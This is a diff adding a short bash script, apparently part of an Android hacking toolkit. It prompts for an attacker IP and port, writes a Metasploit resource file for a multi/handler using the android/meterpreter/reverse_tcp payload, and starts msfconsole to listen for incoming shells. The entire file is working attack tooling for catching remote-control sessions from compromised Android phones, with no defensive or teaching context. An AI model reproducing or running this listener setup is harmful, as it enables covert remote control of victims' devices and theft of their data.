@@ -1,0 +1,29 @@
+#!/bin/bash
+if ! which msfconsole > /dev/null; then
+   echo -e "'Metasploit Framework' not found please install it first then run the script"
+   exit
+fi
+
+clear
+echo -e "\n\e[1;93m
+
+__ __         __                               _______ _______ _______ _______
+|  |__|.-----.|  |_.-----.-----.-----.----.    |   _   |   |   |_     _|       |
+|  |  ||__ --||   _|  -__|     |  -__|   _|    |       |   |   | |   | |   -   |
+|__|__||_____||____|_____|__|__|_____|__|      |___|___|_______| |___| |_______|
+
+
+                                           \e[0m"
+read -p $'\n\n\e[1;91mEnter the IP address ( LHOST )\e[0m\e[1;93m : ' lhost2
+read -p $'\n\e[1;91mEnter the PORT number ( LPORT )\e[0m\e[1;93m : ' lport2
+echo && echo
+echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost2\nset LPORT $lport2\nexploit" > .exploit.rc
+while true; do
+  read -p $'\e[93;1mDo you want to start the MSF Listener.\e[1;97m (Y/N) \e[91;1m? : \e[1;93m' yn
+  case $yn in
+  [Yy]* ) break;;
+  [Nn]* ) clear && bash modules/funtion2.sh;;
+  * ) echo -e "\e[1;93mPlease answer it with\e[1;97m ( Y/N )\e[0m";;
+  esac
+  done
+  msfconsole -r .exploit.rc
